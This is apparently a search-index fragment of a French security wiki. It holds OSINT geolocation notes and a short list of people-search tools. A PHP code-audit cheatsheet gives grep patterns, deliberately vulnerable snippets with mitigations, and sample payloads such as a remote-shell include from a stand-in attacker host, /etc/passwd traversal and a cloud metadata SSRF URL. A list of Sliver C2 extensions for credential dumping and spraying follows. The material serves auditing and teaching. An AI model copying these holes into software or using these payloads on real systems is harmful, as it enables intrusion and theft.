Marquants","text":"<ul> <li> <p>Architecture Coloniale : Recherche les traits distinctifs laiss\u00e9s par les puissances coloniales (espagnole, portugaise, britannique, fran\u00e7aise, n\u00e9erlandaise...) dans les Am\u00e9riques, en Afrique, en Asie.</p> </li> <li> <p>Architecture Victorienne (Fin 19e) : Ornementation riche, bow-windows, tourelles (UK, USA, Canada, Australie, NZ...).</p> </li> <li> <p>Art D\u00e9co (Ann\u00e9es 20-30) : Formes g\u00e9om\u00e9triques, motifs stylis\u00e9s (Miami, New York, nombreuses villes europ\u00e9ennes...).</p> </li> <li> <p>Bloc Sovi\u00e9tique (Apr\u00e8s-guerre) : Grands ensembles d'immeubles standardis\u00e9s en b\u00e9ton pr\u00e9fabriqu\u00e9 (Plattenbau, Panel\u00e1k, Krouchtchevka...). Tr\u00e8s reconnaissables en Europe de l'Est, ex-URSS.</p> </li> <li> <p>Styles Traditionnels Locaux : Pagodes (Asie de l'Est), maisons en bois scandinaves (couleur rouge Falun typique), Riad (Maroc)...</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#9-application-osint","title":"9. Application OSINT","text":"<ul> <li> <p>Identifier le Style Dominant : Permet de cibler une r\u00e9gion ou une p\u00e9riode historique.</p> </li> <li> <p>Rep\u00e9rer les Mat\u00e9riaux Locaux : La g\u00e9ologie influence les mat\u00e9riaux (pierre locale, type de brique).</p> </li> <li> <p>Analyser les Adaptations Climatiques : La forme du toit, la taille des fen\u00eatres, la pr\u00e9sence de climatisations/v\u00e9randas renseignent sur le climat.</p> </li> <li> <p>Noter les D\u00e9tails Uniques : Un type de volet, une forme de chemin\u00e9e, un style de balcon peut \u00eatre tr\u00e8s sp\u00e9cifique.</p> </li> <li> <p>Corroborer : Utiliser l'architecture en conjonction avec la v\u00e9g\u00e9tation, les panneaux, la langue, etc. Comparer avec des images satellites ou des bases de donn\u00e9es (Google Maps, OpenStreetMap, sites immobiliers...).</p> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/","title":"V\u00e9g\u00e9tation","text":""},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#introduction","title":"Introduction","text":"<p>La flore visible dans une image ou une vid\u00e9o \u2013 qu'il s'agisse d'arbres, de cultures agricoles, de plantes sauvages ou m\u00eame de l'\u00e9tat d'une pelouse \u2013 est une source d'indices g\u00e9ographiques de premier ordre. La v\u00e9g\u00e9tation est intimement li\u00e9e au climat (temp\u00e9rature, pr\u00e9cipitations), \u00e0 la latitude, \u00e0 l'altitude et au type de sol, permettant souvent de d\u00e9duire la r\u00e9gion du monde o\u00f9 l'on se trouve.</p>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Types d'Arbres Dominants : Conif\u00e8res (pins, sapins...), feuillus (ch\u00eanes, \u00e9rables...), palmiers, eucalyptus ? For\u00eat dense ou arbres \u00e9pars ?</p> </li> <li> <p>Cultures Agricoles : Champs de c\u00e9r\u00e9ales, rizi\u00e8res, vignobles, vergers, plantations sp\u00e9cifiques (th\u00e9, caf\u00e9, canne \u00e0 sucre...) ?</p> </li> <li> <p>Plantes et Fleurs Sp\u00e9cifiques : Cactus, oliviers, baobabs, plantes typiques d'un biome (toundra, d\u00e9sert, maquis...).</p> </li> <li> <p>Paysage V\u00e9g\u00e9tal G\u00e9n\u00e9ral : For\u00eat dense, prairie, savane, steppe, d\u00e9sert, toundra, maquis/garrigue ?</p> </li> <li> <p>\u00c9tat Saisonni\u00e8r : Arbres en fleurs, feuilles vertes, couleurs d'automne, arbres d\u00e9nud\u00e9s, pr\u00e9sence de neige ?</p> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#2-biomes-climatiques-et-vegetation-associee","title":"2. Biomes Climatiques et V\u00e9g\u00e9tation Associ\u00e9e","text":"<p>Reconna\u00eetre le biome g\u00e9n\u00e9ral est une premi\u00e8re \u00e9tape essentielle :</p> <ul> <li> <p>For\u00eats Tropicales Humides (\u00c9quatoriales) :</p> <ul> <li> <p>Climat : Chaud et tr\u00e8s humide toute l'ann\u00e9e.</p> </li> <li> <p>V\u00e9g\u00e9tation : Tr\u00e8s dense, grands arbres \u00e0 larges feuilles persistantes, lianes, \u00e9piphytes (orchid\u00e9es, foug\u00e8res sur les arbres). Grande biodiversit\u00e9.</p> </li> <li> <p>Localisation : Bassin Amazonien, Bassin du Congo, Asie du Sud-Est.</p> </li> </ul> </li> <li> <p>Savanes / Prairies Tropicales :</p> <ul> <li> <p>Climat : Chaud avec saison s\u00e8che marqu\u00e9e.</p> </li> <li> <p>V\u00e9g\u00e9tation : Hautes herbes dominant, arbres \u00e9pars ou group\u00e9s r\u00e9sistants \u00e0 la s\u00e9cheresse (acacias, baobabs).</p> </li> <li> <p>Localisation : Grande partie de l'Afrique sub-saharienne, certaines r\u00e9gions d'Am\u00e9rique du Sud, Australie, Inde.</p> </li> </ul> </li> <li> <p>D\u00e9serts (Chauds et Froids) :</p> <ul> <li> <p>Climat : Tr\u00e8s faible pluviom\u00e9trie, temp\u00e9ratures extr\u00eames.</p> </li> <li> <p>V\u00e9g\u00e9tation : Tr\u00e8s \u00e9parse, adapt\u00e9e \u00e0 la s\u00e9cheresse : cactus, plantes succulentes, arbustes r\u00e9sistants, herbes rares. Oasis avec palmiers dattiers.</p> </li> <li> <p>Localisation : Sahara, Gobi, Atacama, Sud-Ouest USA, centre Australie...</p> </li> </ul> </li> <li> <p>Climat M\u00e9diterran\u00e9en :</p> <ul> <li> <p>Climat : \u00c9t\u00e9s chauds et secs, hivers doux et humides.</p> </li> <li> <p>V\u00e9g\u00e9tation : Arbustes r\u00e9sistants \u00e0 la s\u00e9cheresse (maquis, garrigue), oliviers, vignes, agrumes, ch\u00eanes-li\u00e8ges, pins sp\u00e9cifiques (pin d'Alep).</p> </li> <li> <p>Localisation : Bassin M\u00e9diterran\u00e9en, Californie, Chili central, r\u00e9gion du Cap (Afrique du Sud), Sud-Ouest de l'Australie.</p> </li> </ul> </li> <li> <p>Prairies Temp\u00e9r\u00e9es (Steppe, Prairie, Pampa) :</p> <ul> <li> <p>Climat : Continental avec variations de temp\u00e9rature, pluviom\u00e9trie mod\u00e9r\u00e9e.</p> </li> <li> <p>V\u00e9g\u00e9tation : Domin\u00e9e par les herbes, peu d'arbres (sauf le long des cours d'eau).</p> </li> <li> <p>Localisation : Grandes Plaines (USA/Canada), Pampas (Argentine), Steppes (Eurasie).</p> </li> </ul> </li> <li> <p>For\u00eats Temp\u00e9r\u00e9es D\u00e9cidues (\u00e0 feuilles caduques) :</p> <ul> <li> <p>Climat : Quatre saisons distinctes, hivers froids.</p> </li> <li> <p>V\u00e9g\u00e9tation : Arbres \u00e0 larges feuilles qui tombent en hiver (ch\u00eanes, \u00e9rables, h\u00eatres, bouleaux...). Couleurs d'automne marqu\u00e9es.</p> </li> <li> <p>Localisation : Est des USA, Europe de l'Ouest et Centrale, Est de l'Asie.</p> </li> </ul> </li> <li> <p>For\u00eats Temp\u00e9r\u00e9es Humides :</p> <ul> <li> <p>Climat : Fortes pr\u00e9cipitations, temp\u00e9ratures mod\u00e9r\u00e9es.</p> </li> <li> <p>V\u00e9g\u00e9tation : Souvent grands conif\u00e8res (Douglas, S\u00e9quoia, \u00c9pic\u00e9a de Sitka) ou feuillus sp\u00e9cifiques. Mousses, lichens et foug\u00e8res abondants.</p> </li> <li> <p>Localisation : C\u00f4te Pacifique Nord-Ouest (USA/Canada), Sud du Chili, Nouvelle-Z\u00e9lande, Norv\u00e8ge c\u00f4ti\u00e8re...</p> </li> </ul> </li> <li> <p>For\u00eats Bor\u00e9ales (Ta\u00efga) :</p> <ul> <li> <p>Climat : Hivers longs et tr\u00e8s froids, \u00e9t\u00e9s courts.</p> </li> <li> <p>V\u00e9g\u00e9tation : Domin\u00e9e par les conif\u00e8res r\u00e9sistants au froid (\u00e9pic\u00e9as, sapins, pins, m\u00e9l\u00e8zes). Plus grand biome terrestre.</p> </li> <li> <p>Localisation : Canada, Alaska, Scandinavie, Sib\u00e9rie.</p> </li> </ul> </li> <li> <p>Toundra :</p> <ul> <li> <p>Climat : Tr\u00e8s froid, permafrost (sol gel\u00e9 en permanence).</p> </li> <li> <p>V\u00e9g\u00e9tation : Absence d'arbres (ou arbres nains), v\u00e9g\u00e9tation basse : mousses, lichens, bruy\u00e8res, saules rampants.</p> </li> <li> <p>Localisation : R\u00e9gions arctiques, hautes montagnes (toundra alpine).</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#3-arbres-et-plantes-indicateurs-specifiques","title":"3. Arbres et Plantes Indicateurs Sp\u00e9cifiques","text":"<p>Certains arbres ou plantes sont embl\u00e9matiques d'une r\u00e9gion :</p> <ul> <li> <p>Palmiers : Indiquent un climat chaud, mais le type est crucial !</p> <ul> <li> <p>Palmier Dattier : Zones arides/d\u00e9sertiques (Moyen-Orient, Afrique du Nord). </p> </li> <li> <p>Cocotier : C\u00f4tes tropicales humides. </p> </li> <li> <p>Palmier de Californie / Washingtonia : Typique du Sud-Ouest USA. </p> </li> <li> <p>Palmier des Canaries : Souvent plant\u00e9 en climat m\u00e9diterran\u00e9en. </p> </li> </ul> </li> <li> <p>Eucalyptus : Natif d'Australie, mais plant\u00e9 massivement ailleurs (Portugal, Californie, Afrique du Sud...). \u00c9corce et feuilles reconnaissables. </p> </li> <li> <p>Olivier : Indicateur fort du climat m\u00e9diterran\u00e9en. Vieux troncs noueux caract\u00e9ristiques. </p> </li> <li> <p>Bouleau : \u00c9corce blanche distinctive, commun dans les zones temp\u00e9r\u00e9es froides et bor\u00e9ales (Europe du Nord, Russie, Canada). </p> </li> <li> <p>Pins : Extr\u00eamement vari\u00e9s. La forme de l'arbre, la longueur et le groupement des aiguilles sont des indices. Pin Sylvestre (Europe), Pin Ponderosa (Ouest USA), Pin Parasol (M\u00e9diterran\u00e9e)... </p> </li> <li> <p>Baobab : Tronc massif embl\u00e9matique (Afrique, Madagascar, Australie). </p> </li> <li> <p>Arbre de Josu\u00e9 (Joshua Tree) : End\u00e9mique du D\u00e9sert de Mojave (USA). </p> </li> <li> <p>Cypr\u00e8s : Forme \u00e9lanc\u00e9e \"colonne\" (Cypr\u00e8s d'Italie/Provence) typique de la M\u00e9diterran\u00e9e ; Cypr\u00e8s chauve dans les zones mar\u00e9cageuses du Sud-Est USA. </p> </li> <li> <p>Bambou : Herbe g\u00e9ante \u00e0 croissance rapide, tr\u00e8s commune en Asie, mais pr\u00e9sente ailleurs.</p> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#4-indices-agricoles","title":"4. Indices Agricoles","text":"<p>Les cultures renseignent sur le climat et les pratiques locales :</p> <ul> <li> <p>Rizi\u00e8res : Champs inond\u00e9s, souvent en terrasses (Asie de l'Est et du Sud-Est). </p> </li> <li> <p>Vignobles : Climat temp\u00e9r\u00e9 ou m\u00e9diterran\u00e9en. Le mode de conduite de la vigne (palissage) peut varier. </p> </li> <li> <p>Plantations de Th\u00e9 : Souvent \u00e0 flanc de colline, arbustes taill\u00e9s (Asie, Afrique de l'Est). </p> </li> <li> <p>Plantations de Caf\u00e9 : Arbustes en zones tropicales/subtropicales d'altitude.</p> </li> <li> <p>Canne \u00e0 Sucre : Haute \"herbe\", climat tropical/subtropical.</p> </li> <li> <p>C\u00e9r\u00e9ales (Bl\u00e9, Orge, Ma\u00efs...) : Tr\u00e8s r\u00e9pandues en zones temp\u00e9r\u00e9es. L'aspect change selon la saison.</p> </li> <li> <p>Tournesols : Grands champs jaunes en \u00e9t\u00e9 (Europe de l'Est, France, USA...).</p> </li> <li> <p>Colza : Champs d'un jaune \u00e9clatant au printemps (Europe, Canada...). </p> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#5-autres-indices-vegetaux","title":"5. Autres Indices V\u00e9g\u00e9taux","text":"<ul> <li> <p>Pelouses (Gazon) : Vert intense toute l'ann\u00e9e sugg\u00e8re un climat humide ou une forte irrigation. Pelouses jaunies indiquent une saison s\u00e8che ou un climat aride.</p> </li> <li> <p>Haies : Les esp\u00e8ces utilis\u00e9es pour les haies varient (thuya, cypr\u00e8s, h\u00eatre, charme, tro\u00e8ne, buis, esp\u00e8ces locales...).</p> </li> <li> <p>Plantes Ornementales : Bougainvilliers (climats chauds), rhododendrons, hortensias... peuvent donner des indices.</p> </li> </ul>"},{"location":"Osint/Lieux/V%C3%A9g%C3%A9tation/#6-application-osint","title":"6. Application OSINT","text":"<ul> <li> <p>D\u00e9duire le Climat et la Latitude : La v\u00e9g\u00e9tation est un proxy climatique tr\u00e8s fiable.</p> </li> <li> <p>Identifier des Esp\u00e8ces End\u00e9miques/Embl\u00e9matiques : Un Joshua Tree, un baobab ou un eucalyptus (dans son aire native) sont des indices tr\u00e8s forts.</p> </li> <li> <p>Analyser les Paysages Agricoles : Les types de cultures et les m\u00e9thodes (terrasses, irrigation...) sont culturellement et g\u00e9ographiquement marqu\u00e9s.</p> </li> <li> <p>Corroborer : Utiliser la v\u00e9g\u00e9tation avec l'architecture, le relief, les indices routiers. Comparer avec des cartes de biomes, des donn\u00e9es agricoles, des images satellites.</p> </li> </ul>"},{"location":"Osint/Tools%20locaux/Webcams%20publiques/","title":"Webcams publiques","text":"<p>https://github.com/josh0xA/Pantheon</p>"},{"location":"Osint/Tools%20online/Lieux/","title":"Lieux","text":"<p>Outil de cartographie : https://www.cachesleuth.com/</p> <p>Recherche de donn\u00e9es g\u00e9ographiques (FR) : https://www.geoportail.gouv.fr/</p> <p>Infrastructures ferroviaires (monde) : https://www.openrailwaymap.org/</p> <p>Recherches sur les montagnes/reliefs (monde) : https://www.peakfinder.com/</p> <p>Identification des montagnes/reliefs (monde) : https://peakvisor.com/</p> <p>Donn\u00e9es sur les \u00e9clairages publiques : http://phozagora.free.fr/</p>"},{"location":"Osint/Tools%20online/Personnes/","title":"Personnes","text":""},{"location":"Osint/Tools%20online/Personnes/#mails","title":"Mails","text":"<p>Epieos : https://epieos.com/</p>"},{"location":"Osint/Tools%20online/Personnes/#photos","title":"Photos","text":"<p>Pimeyes : https://pimeyes.com/en</p>"},{"location":"Osint/Tools%20online/Personnes/#pseudo","title":"Pseudo","text":"<p>namechk : https://namechk.com/</p>"},{"location":"Red%20Team/Audit%20de%20code/PHP/","title":"PHP","text":"<p>Objectif : Identifier rapidement les points potentiellement vuln\u00e9rables dans une base de code PHP lors d'un audit de s\u00e9curit\u00e9 statique (SAST - Static Application Security Testing). Cette cheatsheet se concentre sur des fonctions et des patterns connus pour \u00eatre souvent sources de vuln\u00e9rabilit\u00e9s.</p> <p>Note : L'audit statique doit \u00eatre compl\u00e9t\u00e9 par un audit dynamique et une compr\u00e9hension du contexte d'ex\u00e9cution. La pr\u00e9sence d'une fonction list\u00e9e ici n'implique pas automatiquement une vuln\u00e9rabilit\u00e9 si les entr\u00e9es sont correctement valid\u00e9es et \u00e9chapp\u00e9es.</p>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#outils-danalyse-statique-sast-pour-php","title":"\u2699\ufe0f Outils d'Analyse Statique (SAST) pour PHP","text":"<p>Avant de chercher manuellement, envisagez d'utiliser des outils SAST qui automatisent une partie de la d\u00e9tection :</p> <ul> <li>PHPStan (https://github.com/phpstan/phpstan)</li> <li>Psalm (https://github.com/vimeo/psalm)</li> <li>SonarQube (avec SonarPHP) (https://www.sonarsource.com/products/sonarqube/)</li> <li>Semgrep (https://github.com/semgrep/semgrep) - Avec des r\u00e8gles sp\u00e9cifiques PHP.</li> <li>PHP CS Fixer / PHP CodeSniffer : Plus pour le style, mais peuvent aider \u00e0 rep\u00e9rer des pratiques non standard.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#recherche-manuelle-par-type-de-vulnerabilite-grep","title":"\ud83c\udfaf Recherche Manuelle par Type de Vuln\u00e9rabilit\u00e9 (<code>grep</code>)","text":"<p>(Ex\u00e9cutez ces commandes \u00e0 la racine du code source)</p>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#injection-sql-sqli","title":"\ud83d\udc89 Injection SQL (SQLi)","text":"<ul> <li>Recherche : Fonctions ex\u00e9cutant des requ\u00eates sans pr\u00e9paration ad\u00e9quate. <pre><code># Fonctions de base de donn\u00e9es classiques (ex: mysqli, pdo)\ngrep -RinE --include=*.php '(mysqli_query|query\\(|-&gt;query\\(|execute\\(|-&gt;execute\\()' .\n# Fonctions PDO sp\u00e9cifiques (prepare est bien, mais v\u00e9rifier comment les variables sont li\u00e9es)\ngrep -RinE --include=*.php 'prepare\\(|-&gt;prepare\\(' .\n# Recherche de concat\u00e9nation directe de variables dans les requ\u00eates\ngrep -RinE --include=*.php 'SELECT .*[\\$\\_](GET|POST|REQUEST|COOKIE)|INSERT .*[\\$\\_](GET|POST|REQUEST|COOKIE)|UPDATE .*[\\$\\_](GET|POST|REQUEST|COOKIE)|DELETE .*[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable : <pre><code>&lt;?php\n$id = $_GET['id'];\n$result = $mysqli-&gt;query(\"SELECT * FROM products WHERE id = \" . $id); // Injection possible ici\n?&gt;\n</code></pre></li> <li>Mitigation : Utiliser syst\u00e9matiquement les requ\u00eates pr\u00e9par\u00e9es (Prepared Statements) avec <code>mysqli_prepare</code> / <code>bind_param</code> / <code>execute</code> ou PDO (<code>prepare</code>, <code>bindParam</code>/<code>bindValue</code>, <code>execute</code>).</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#execution-de-commandes-rce-remote-code-execution","title":"\ud83d\udef0\ufe0f Ex\u00e9cution de Commandes (RCE - Remote Code Execution)","text":"<ul> <li>Recherche : Fonctions ex\u00e9cutant des commandes syst\u00e8me ou interpr\u00e9tant du code. <pre><code>grep -RinE --include=*.php '(system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec|`.*`|eval|assert|create_function|include|require|include_once|require_once)' .\n# Sp\u00e9cifiquement pour les backticks (op\u00e9rateur d'ex\u00e9cution)\ngrep -Rin --include=*.php '`' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable (<code>shell_exec</code>) : <pre><code>&lt;?php\n$cmd = $_GET['cmd'];\necho shell_exec('ping -c 3 ' . $cmd); // RCE via injection de commande (ex: ; ls -la)\n?&gt;\n</code></pre></li> <li>Exemple Vuln\u00e9rable (<code>eval</code>) : <pre><code>&lt;?php\n$code = $_GET['code'];\neval(\"\\$result = \" . $code . \";\"); // RCE directe si $code contient du PHP malveillant\n?&gt;\n</code></pre></li> <li>Mitigation : \u00c9viter autant que possible ces fonctions avec des entr\u00e9es utilisateur. Si n\u00e9cessaire, utiliser <code>escapeshellarg()</code> ou <code>escapeshellcmd()</code> (avec prudence, ne prot\u00e8ge pas de tout) et valider tr\u00e8s strictement les entr\u00e9es (liste blanche). \u00c9viter <code>eval</code>, <code>assert</code>, <code>create_function</code> avec des donn\u00e9es externes.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#inclusion-de-fichiers-lfirfi-localremote-file-inclusion","title":"\ud83e\ude82 Inclusion de Fichiers (LFI/RFI - Local/Remote File Inclusion)","text":"<ul> <li>Recherche : Fonctions incluant des fichiers bas\u00e9s sur une entr\u00e9e. <pre><code>grep -RinE --include=*.php '(include|require|include_once|require_once)\\s*\\(?[\\s\"\\']?[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n# Fonctions de lecture de fichiers pouvant mener \u00e0 LFI ou Directory Traversal\ngrep -RinE --include=*.php '(file_get_contents|fopen|file|readfile)\\s*\\(?[\\s\"\\']?[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable (LFI) : <pre><code>&lt;?php\n$page = $_GET['page'];\ninclude($page . '.php'); // LFI possible avec ../../.. ou wrappers php://\n?&gt;\n</code></pre></li> <li>Exemple Vuln\u00e9rable (RFI - si <code>allow_url_include=On</code>) : <pre><code>&lt;?php\n$module = $_GET['module'];\ninclude($module); // RFI possible si $module = [http://attaquant.com/shell.txt](https://www.google.com/search?q=http://attaquant.com/shell.txt)\n?&gt;\n</code></pre></li> <li>Mitigation : Ne jamais inclure de fichiers bas\u00e9s directement sur une entr\u00e9e utilisateur. Utiliser une liste blanche (whitelist) de fichiers autoris\u00e9s. D\u00e9sactiver <code>allow_url_fopen</code> et <code>allow_url_include</code> dans <code>php.ini</code> si possible. Utiliser <code>basename()</code> ou valider strictement le chemin.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#directory-traversal","title":"\ud83d\udeb6 Directory Traversal","text":"<ul> <li>Recherche : Utilisation de fonctions de fichiers avec des chemins potentiellement contr\u00f4l\u00e9s par l'utilisateur. <pre><code>grep -RinE --include=*.php '(fopen|file_get_contents|file_put_contents|readfile|unlink|copy|rename|mkdir|rmdir|scandir|glob)\\s*\\(?[\\s\"\\']?[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable : <pre><code>&lt;?php\n$filename = $_GET['file'];\n$content = file_get_contents('/var/www/app/user_files/' . $filename); // Traversal possible avec $filename = ../../etc/passwd\n?&gt;\n</code></pre></li> <li>Mitigation : Valider et nettoyer les chemins (<code>basename()</code>), v\u00e9rifier que le chemin r\u00e9solu (<code>realpath()</code>) reste dans le r\u00e9pertoire attendu (chroot virtuel).</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#cross-site-scripting-xss","title":"\ud83e\uddc1 Cross-Site Scripting (XSS)","text":"<ul> <li>Recherche : Affichage direct de donn\u00e9es utilisateur sans \u00e9chappement HTML. <pre><code>grep -RinE --include=*.php '(echo|print|&lt;\\?=)[\\s\\(]*[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable : <pre><code>&lt;?php\n$name = $_GET['name'];\necho \"&lt;h1&gt;Bonjour, \" . $name . \"&lt;/h1&gt;\"; // XSS possible si name contient &lt;script&gt;alert(1)&lt;/script&gt;\n?&gt;\n</code></pre></li> <li>Mitigation : Utiliser <code>htmlspecialchars($variable, ENT_QUOTES, 'UTF-8')</code> ou des moteurs de template s\u00e9curis\u00e9s (Twig, Blade) qui \u00e9chappent par d\u00e9faut. D\u00e9finir l'en-t\u00eate <code>Content-Security-Policy</code>.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#file-upload-vulnerabilities","title":"\ud83d\udce4 File Upload Vulnerabilities","text":"<ul> <li>Recherche : Traitement des fichiers upload\u00e9s (<code>$_FILES</code>). <pre><code>grep -Rin --include=*.php '\\$_FILES\\[' .\ngrep -RinE --include=*.php '(move_uploaded_file|copy)\\s*\\(?.*[\\$\\_]FILES' .\n</code></pre></li> <li>Points \u00e0 v\u00e9rifier :<ul> <li>Validation du type de fichier (MIME type <code>$_FILES['userfile']['type']</code> n'est pas fiable, v\u00e9rifier l'extension et id\u00e9alement le contenu/magic bytes).</li> <li>Validation de la taille (<code>$_FILES['userfile']['size']</code>).</li> <li>Contr\u00f4le du nom de fichier (\u00e9viter les <code>..</code>, les extensions multiples <code>shell.php.jpg</code>, g\u00e9n\u00e9rer un nom al\u00e9atoire).</li> <li>Stockage des fichiers upload\u00e9s en dehors du webroot ou avec des permissions tr\u00e8s restrictives (pas d'ex\u00e9cution).</li> <li>Utilisation de <code>move_uploaded_file()</code> plut\u00f4t que <code>copy()</code>.</li> </ul> </li> <li>Mitigation : Valider type, taille, nom. Renommer les fichiers. Stocker hors webroot ou configurer le serveur web pour ne pas ex\u00e9cuter de code dans le dossier d'upload.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#insecure-deserialization","title":"\ud83d\udd13 Insecure Deserialization","text":"<ul> <li>Recherche : Utilisation de la fonction <code>unserialize()</code> sur des donn\u00e9es contr\u00f4l\u00e9es par l'utilisateur. <pre><code>grep -RinE --include=*.php 'unserialize\\s*\\(?[\\s\"\\']?[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable : <pre><code>&lt;?php\n    $user_data = unserialize($_COOKIE['userdata']); // Dangereux si le cookie peut \u00eatre manipul\u00e9\n?&gt;\n</code></pre></li> <li>Mitigation : Ne jamais utiliser <code>unserialize()</code> sur des donn\u00e9es non fiables. Pr\u00e9f\u00e9rer JSON (<code>json_decode</code>/<code>json_encode</code>) ou d'autres formats s\u00e9rialis\u00e9s s\u00fbrs. Si <code>unserialize</code> est in\u00e9vitable, utiliser l'option <code>allowed_classes</code> (PHP 7+).</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#server-side-request-forgery-ssrf","title":"\ud83d\udd17 Server-Side Request Forgery (SSRF)","text":"<ul> <li>Recherche : Fonctions effectuant des requ\u00eates HTTP/fichier bas\u00e9es sur une entr\u00e9e utilisateur. <pre><code>grep -RinE --include=*.php '(curl_exec|file_get_contents|fsockopen|fopen)\\s*\\(?.*[\\$\\_](GET|POST|REQUEST|COOKIE)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable : <pre><code>&lt;?php\n$url = $_GET['url'];\n$content = file_get_contents($url); // SSRF si $url = [http://169.254.169.254/latest/meta-data/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/) ou file:///etc/passwd\n?&gt;\n</code></pre></li> <li>Mitigation : Valider strictement les URL (liste blanche de domaines/IPs autoris\u00e9s). Ne pas autoriser les sch\u00e9mas <code>file://</code>, <code>gopher://</code>, etc. Configurer des pare-feux pour limiter les requ\u00eates sortantes du serveur.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#xml-external-entity-xxe","title":"\ud83c\udfdb\ufe0f XML External Entity (XXE)","text":"<ul> <li>Recherche : Traitement de fichiers XML avec des parseurs potentiellement mal configur\u00e9s. <pre><code>grep -RinE --include=*.php '(simplexml_load_string|simplexml_load_file|DOMDocument-&gt;load|DOMDocument-&gt;loadXML|xml_parse)' .\n</code></pre></li> <li>Exemple Vuln\u00e9rable (avant PHP 8) : <pre><code>&lt;?php\nlibxml_disable_entity_loader(false); // Active le chargement des entit\u00e9s externes (DANGEREUX)\n$xml = $_POST['xml'];\n$dom = new DOMDocument();\n$dom-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // XXE possible\n?&gt;\n</code></pre></li> <li>Mitigation : D\u00e9sactiver le chargement des entit\u00e9s externes : <code>libxml_disable_entity_loader(true);</code> (par d\u00e9faut depuis PHP 8.0). Utiliser <code>LIBXML_NONET</code> lors du parsing si possible.</li> </ul>"},{"location":"Red%20Team/Audit%20de%20code/PHP/#comparaisons-faibles-weak-type-comparison","title":"\u2696\ufe0f Comparaisons Faibles (Weak Type Comparison)","text":"<ul> <li>Recherche : Utilisation de <code>==</code> au lieu de <code>===</code> pour des comparaisons, surtout avec des fonctions comme <code>strcmp</code>, <code>strpos</code>, ou lors de v\u00e9rifications d'authentification/autorisation. <pre><code>grep -RinE --include=*.php '\\s==\\s' . # Tr\u00e8s g\u00e9n\u00e9rique, affinage n\u00e9cessaire\ngrep -RinE --include=*.php '(strcmp|strpos)\\s*\\(.*?\\)\\s*==\\s*0' . # strcmp/strpos peuvent retourner 0 ou false\n</code></pre></li> <li>Exemple Vuln\u00e9rable (<code>strcmp</code>) : <pre><code>&lt;?php\n// Si $password est un tableau envoy\u00e9 par l'attaquant (ex: password[]=), strcmp retourne NULL.\n// NULL == 0 est TRUE en comparaison faible !\nif (strcmp($_POST['password'], $stored_password) == 0) {\necho \"Login r\u00e9ussi!\";\n}\n?&gt;\n</code></pre></li> <li>Mitigation : Utiliser la comparaison stricte <code>===</code> qui v\u00e9rifie aussi le type. Pour <code>strcmp</code>, v\u00e9rifier explicitement <code>strcmp(...) === 0</code>. Pour <code>strpos</code>, v\u00e9rifier <code>strpos(...) !== false</code>.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Armory/","title":"Armory","text":"Command Name Version Type Help bof-roast v0.0.2 Extension Beacon Object File repo for roasting Active Directory bof-servicemove v0.0.1 Extension Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking c2tc-addmachineaccount v0.0.9 Extension AddMachineAccount [Computername] [Password ] c2tc-askcreds v0.0.9 Extension Collect passwords using CredUIPromptForWindowsCredentialsName c2tc-domaininfo v0.0.9 Extension enumerate domain information using Active Directory Domain Services c2tc-kerberoast v0.0.9 Extension A BOF tool to list all SPN enabled user/service accounts or request service tickets (TGS-REP) c2tc-kerbhash v0.0.9 Extension port of the Mimikatz/Rubeus hash command c2tc-klist v0.0.9 Extension Displays a list of currently cached Kerberos tickets. c2tc-lapsdump v0.0.9 Extension Dump LAPS passwords from specified computers within Active Directory c2tc-petitpotam v0.0.9 Extension PetitPotam  c2tc-psc v0.0.9 Extension show detailed information from processes with established TCP and RDP connections c2tc-psk v0.0.9 Extension show detailed information from the windows kernel and loaded driver modules c2tc-psm v0.0.9 Extension show detailed information from a specific process id c2tc-psw v0.0.9 Extension Show Window titles from processes with active Windows c2tc-psx v0.0.9 Extension show (detailed) information from all processes running on the system c2tc-smbinfo v0.0.9 Extension Gather remote system version info using the NetWkstaGetInfo API c2tc-spray-ad v0.0.9 Extension Perform a Kerberos or ldap password spraying attack against Active Directory c2tc-startwebclient v0.0.9 Extension Starting WebClient Service Programmatically c2tc-wdtoggle v0.0.9 Extension Patch lsass to enable WDigest credential caching c2tc-winver v0.0.9 Extension Display the version of Windows that is running, the build number and patch release (Update Build Revision) certify v0.0.3 Alias Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services 